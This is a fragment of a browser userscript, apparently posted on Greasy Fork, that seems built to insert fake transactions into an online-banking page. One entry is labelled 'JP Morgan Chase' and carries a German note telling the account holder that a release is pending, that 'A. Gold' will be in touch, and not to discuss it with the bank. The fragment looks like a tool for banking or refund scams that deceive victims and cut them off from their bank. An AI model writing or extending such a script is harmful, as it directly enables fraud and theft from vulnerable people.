// ==UserScript==
// @name         Ed Start 4Rec Sp svenendler@gmx.de
...
// @downloadURL https://update.greasyfork.org/scripts/503643/Ed%20Start%204Rec%20Sp%20svenendler%40gmxde.user.js
// @updateURL https://update.greasyfork.org/scripts/503643/Ed%20Start%204Rec%20Sp%20svenendler%40gmxde.meta.js
// ==/UserScript==
...
//+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
    ...
    var accountsecurity = "4000 2503 67";
 ...
 //       },
        {
            ...
            decimalAmount: ',50',
            transactionTitle: 'JP Morgan Chase',  /// !!! NEEDS TO BE DIFFERENT FROM OTHERS
            transactionInfo: "Freigabe nötig. A. Gold meldet sich. Mit Bank nicht besprechen, damit nicht gesperrt.",
            isNegative: false, // Example flag, modify this based on your actual logic,
